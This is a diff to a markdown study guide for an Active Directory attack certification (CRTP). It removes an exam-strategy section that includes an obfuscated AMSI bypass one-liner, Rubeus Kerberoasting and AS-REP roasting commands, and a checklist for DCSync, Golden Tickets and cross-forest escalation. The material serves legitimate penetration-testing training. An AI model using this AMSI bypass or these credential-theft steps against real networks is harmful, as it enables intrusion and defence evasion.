@@ -5,7 +5,7 @@ Altered Security | Attacking & Defending Active Directory
 
 By DarcHacker.
 
-LinkedIn:[www.linkedin.com/in/mostafa-ibrahim-60b543341](http://www.linkedin.com/in/mostafa-ibrahim-60b543341)
+**LinkedIn:** [Mostafa Ibrahim](https://www.linkedin.com/in/mostafa-ibrahim-60b543341)  
 
 ---
 
@@ -44,8 +44,7 @@ LinkedIn:[www.linkedin.com/in/mostafa-ibrahim-60b543341](http://www.linkedin.com
 | 26 | [MSSQL Server Attacks](about:blank#26-mssql-server-attacks) | PowerUpSQL, linked servers, xp_cmdshell |
 | 27 | [Defenses & Detection Bypasses](about:blank#27-defenses--detection-bypasses) | MDI, Defender, logging |
 | 28 | [Sliver C2 Framework](about:blank#28-sliver-c2-framework) | Beacons, pivoting, operations |
-| 29 | [CRTP Exam Strategy & Checklists](about:blank#29-crtp-exam-strategy--checklists) | 24-hour roadmap, scoring |
-| 30 | [Essential Resources & Links](about:blank#30-essential-resources--links) | Tools, websites, references |
+| 29 | [Essential Resources & Links](about:blank#29-essential-resources--links) | Tools, websites, references |
 
 ---
 
@@ -2296,151 +2295,8 @@ execute-assembly /kali/SharpHound.exe -c All
 
 ---
 
-## 29 CRTP Exam Strategy & Checklists
 
-### Exam Overview
-
-```
-╔═══════════════════════════════════════════════════════════════╗
-║  24-HOUR HANDS-ON EXAM                                       ║
-║  5 Target machines + 1 Foothold machine                      ║
-║  Environment: Fully patched Windows + Defender + MDI active  ║
-║  Goal: Complete all challenges                               ║
-║  Report: Submit detailed solutions + mitigations             ║
-║  No full writeup needed, but evidence required               ║
-╚═══════════════════════════════════════════════════════════════╝
-
-Exam lab:
-  student (foothold)
-    └── machine1  (domain member)
-    └── machine2  (domain member)
-    └── machine3  (domain member / DC)
-    └── machine4  (parent domain DC / forest root)
-    └── machine5  (additional domain / linked)
-```
-
-### Pre-Exam Setup Checklist
-
-```
-[ ] VPN connected — test ping to all machines
-[ ] Start Invisi-Shell on student machine immediately
-[ ] AMSI bypass in each new PS session
-[ ] Prepare tools: SafetyKatz, Rubeus, PowerView, BloodHound, PowerUpSQL
-[ ] Start Sliver server + listener (if using C2)
-[ ] Set up Python HTTP server for file transfers
-[ ] Open note-taking tool (Obsidian/CherryTree) — one folder per machine
-[ ] Check: hostname, whoami, domain, DC name, domain SID
-```
-
-### Attack Path Order
-
-```
-PHASE 1: Enumerate Everything (DO NOT skip)
-  [ ] Run PowerView: users, groups, ACLs, SPNs, delegation, trusts
-  [ ] Run BloodHound SharpHound collection
-  [ ] Analyze BloodHound: "Shortest Paths to DA"
-  [ ] Identify: Kerberoastable users, AS-REP users, delegation
-  [ ] Identify: Local admin rights for student1
-  [ ] Identify: Interesting ACLs
-
-PHASE 2: Get Local Admin (if not already)
-  [ ] Run Find-LocalAdminAccess
-  [ ] Check Jenkins / other apps for RCE
-  [ ] Run PowerUp for local privesc
-
-PHASE 3: Credential Collection
-  [ ] PSRemote to accessible machines
-  [ ] SafetyKatz logonpasswords on each accessible machine
-  [ ] Look for high-value accounts (svcadmin, webadmin, etc.)
-
-PHASE 4: Domain Privilege Escalation (pick the easiest path)
-  [ ] Kerberoast → crack → use credentials
-  [ ] Unconstrained delegation + PrintSpooler → steal DA TGT
-  [ ] Constrained delegation → S4U to DA
-  [ ] ACL abuse → add to DA group or DCSync rights
-
-PHASE 5: Persistence (do this BEFORE moving to forest)
-  [ ] DCSync → get krbtgt hash
-  [ ] Forge Golden Ticket
-  [ ] Add AdminSDHolder ACE
-  [ ] Set DCSync ACL on domain object
-
-PHASE 6: Cross-Domain (Child → Forest Root)
-  [ ] Method 1: Child krbtgt + EA SID history → access forest root
-  [ ] Method 2: Trust ticket
-
-PHASE 7: Cross-Forest (if applicable)
-  [ ] Enumerate trusts to eurocorp.local
-  [ ] Kerberoast across trust
-  [ ] SID history injection (if filtering disabled)
-  [ ] MSSQL linked servers across forest
-
-PHASE 8: Document + Report
-  [ ] Screenshot for every step
-  [ ] Include hostname + whoami in every screenshot
-  [ ] Document mitigations for each technique
-```
-
-### Documentation Requirements for Each Machine
-
-```
-Per machine, document:
-  ✓ Initial enumeration findings
-  ✓ Attack path chosen (explain WHY)
-  ✓ Commands run (exact copy-paste)
-  ✓ Tool output (screenshots + text)
-  ✓ Privilege obtained (screenshot: whoami + hostname)
-  ✓ Credentials/hashes obtained
-  ✓ Mitigation recommendation
-
-Screenshot format:
-  [whoami output]
-  [hostname]
-  [flag or proof of DA access]
-  [ip config / domain info]
-  All in ONE screenshot per machine.
-```
-
-### Quick Command Reference (Exam Day)
-
-```powershell
-# ── STARTUP SEQUENCE ─────────────────────────────────────────────────────
-# 1. Run Invisi-Shell
-C:\AD\Tools\InvisiShell\RunWithRegistryNonAdmin.bat
-
-# 2. AMSI bypass (run in every new PS session):
-S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
-
-# 3. Load PowerView:
-. C:\AD\Tools\PowerView.ps1
-
-# 4. Quick domain info:
-Get-Domain; Get-DomainController; Get-DomainSID
-
-# 5. Find local admin access:
-Find-LocalAdminAccess
-
-# 6. Enumerate ACLs:
-Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "student"}
-
-# 7. Run BloodHound:
-. C:\AD\Tools\BloodHound-master\Collectors\SharpHound.ps1
-Invoke-BloodHound -CollectionMethod All -Verbose
-
-# 8. Check Kerberoastable:
-.\Rubeus.exe kerberoast /outfile:kerb.txt
-
-# 9. Check AS-REP roastable:
-.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
-
-# 10. Check delegation:
-Get-DomainComputer -Unconstrained | select samaccountname
-Get-DomainUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto
-```
-
----
-
-## 30 Essential Resources & Links
+## 29 Essential Resources & Links
 
 ### Official Course
 
@@ -2632,4 +2488,4 @@ Add-DomainGroupMember           Set-DomainObjectOwner
 
 By DarcHacker.
 
-LinkedIn:[www.linkedin.com/in/mostafa-ibrahim-60b543341](http://www.linkedin.com/in/mostafa-ibrahim-60b543341)
+**LinkedIn:** [Mostafa Ibrahim](https://www.linkedin.com/in/mostafa-ibrahim-60b543341)  
